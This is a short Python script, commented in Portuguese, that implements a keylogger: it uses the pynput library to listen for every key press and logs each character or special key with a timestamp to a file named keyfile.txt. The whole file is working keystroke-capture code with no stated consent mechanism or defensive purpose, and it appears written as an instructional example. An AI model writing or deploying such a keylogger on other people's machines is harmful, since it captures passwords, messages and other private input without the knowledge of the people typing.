from pynput import keyboard  # Importa o módulo 'keyboard' da biblioteca 'pynput' para monitorar eventos do teclado
import logging  # Importa o módulo 'logging' para registrar eventos em um arquivo

# Configura o logger para escrever os logs no arquivo "keyfile.txt"
logging.basicConfig(
    filename="keyfile.txt",  # Nome do arquivo onde os logs serão armazenados
    level=logging.DEBUG,  # Define o nível de log como DEBUG para capturar todas as mensagens de log
    format="%(asctime)s: %(message)s"  # Define o formato do log com timestamp e mensagem
)

def keyPressed(key):
    try:
        # Verifica se o objeto 'key' possui o atributo 'char' e se não é None
        if hasattr(key, 'char') and key.char:
            # Registra o caractere pressionado no arquivo de log
            logging.info(str(key.char))
        else:
            # Para teclas especiais que não possuem um 'char', registra a representação da tecla
            logging.info(str(key))
    except AttributeError as e:
        # Registra qualquer erro que ocorra ao tentar acessar o atributo 'char'
        logging.error(f"Erro ao acessar o atributo 'char': {e}")

if __name__ == "__main__":
    # Inicia o listener de teclado e mantém o programa em execução para monitorar eventos de teclado
    with keyboard.Listener(on_press=keyPressed) as listener:
        # Aguarda eventos de teclado e continua em execução
        listener.join()
